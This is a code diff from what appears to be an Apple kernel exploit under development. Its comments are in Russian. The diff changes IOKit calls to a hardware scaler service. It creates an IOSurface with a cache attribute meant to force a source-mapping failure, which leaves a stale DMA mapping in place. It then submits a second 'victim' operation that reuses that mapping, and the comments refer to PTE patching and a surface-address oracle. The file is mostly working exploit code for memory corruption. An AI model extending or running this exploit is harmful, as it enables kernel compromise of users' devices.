@@ -6285,14 +6285,24 @@ static int kpJSubmitAsync(io_connect_t conn, uint32_t srcID, uint32_t dstID,
     *(uint64_t *)(tsdZ + 8) = 1;   // async
     for (int i = 0; i < 0; i++)   // 1.9.161: churn не нужен — подмена ДО submit (фаза 1), PTE патчится после execute #1 (фаза 2); 800 валидных опов держали очередь и victim#1 не успевал исполниться
         IOConnectCallMethod(churn, 1, NULL, 0, tsdZ, KP_M2_TSD_SIZE, NULL, NULL, NULL, NULL);
-    // victim async с ОТКАЛИБРОВАННЫМ TSD (при execute сделает DMA)
+    // 1.9.178 (р.45): детерминированный src-map-fail БЕЗ гигантских dims —
+    // src с IOSurfaceMapCacheAttribute=0: create/resolve проходят, но mode-check
+    // scaler'а (0x927b6ec) требует mem-flags {1,2} → ret 0x2c2 до DVA-alloc,
+    // после dst map (w2=0), до doorbell (0x928f830) = cold-TLB + живой mapping.
+    NSMutableDictionary *spBad = [sp mutableCopy];
+    spBad[@"IOSurfaceMapCacheAttribute"] = @0;
+    IOSurfaceRef srcBad = IOSurfaceCreate((__bridge CFDictionaryRef)spBad);
+    uint32_t srcBadID = srcBad ? IOSurfaceGetID(srcBad) : srcID;
+    kpNote(r, [NSString stringWithFormat:@"  srcBad: %@ (id=%u) — MapCacheAttribute=0 для src-map-fail",
+              srcBad ? @"создан" : @"NULL (fallback srcS)", srcBadID]);
+    // victim async с ОТКАЛИБРОВАННЫМ TSD (при execute сделает DMA — но не с srcBad)
     uint8_t tsdV[0x1B0];
     memcpy(tsdV, tsdGood, sizeof(tsdV));
-    *(uint32_t *)(tsdV + 0) = srcID;
+    *(uint32_t *)(tsdV + 0) = srcBadID;
     *(uint32_t *)(tsdV + 4) = dstID;
     *(uint64_t *)(tsdV + 8) = 1;   // async
     kern_return_t avkr = IOConnectCallMethod(victim, 1, NULL, 0, tsdV, sizeof(tsdV), NULL, NULL, NULL, NULL);
-    kpNote(r, [NSString stringWithFormat:@"  victim async submit (backlog=0): kr=0x%x", avkr]);
+    kpNote(r, [NSString stringWithFormat:@"  victim#1 async submit (srcBad, cold-TLB): kr=0x%x — ждём dst map ок + src fail 0x2c2", avkr]);
     // 1.9.147: OP-ENTRY ОРАКУЛ — surfVA из самой оп-записи scheduler'а, без портов
     // и реестра. Submit (sel1) резолвит surface ptr в op-entry (раунд 24); нашу
     // запись находим по credit=0x10 (sel10 выше), сканируем 0x21c0 на указатели,
@@ -6869,6 +6879,7 @@ static int kpJSubmitAsync(io_connect_t conn, uint32_t srcID, uint32_t dstID,
                 // свежим (bit43=0), иначе при отсутствии кэша DMA вообще нет
                 uint8_t tsdV2[0x1B0];
                 memcpy(tsdV2, tsdV, sizeof(tsdV2));
+                *(uint32_t *)(tsdV2 + 0) = srcID;   // 1.9.178: victim#2 — src fresh НАСТОЯЩИЙ (tsdV нёс srcBad), dst тот же + reuse
                 *(uint64_t *)(tsdV2 + 0x20) |= (1ULL << 43);
                 kern_return_t v2kr = IOConnectCallMethod(victim, 1, NULL, 0, tsdV2, sizeof(tsdV2), NULL, NULL, NULL, NULL);
                 kpNote(r, [NSString stringWithFormat:@"  [P2] victim #2 submit (reuse mapping): kr=0x%x — жду DMA в ctl", v2kr]);
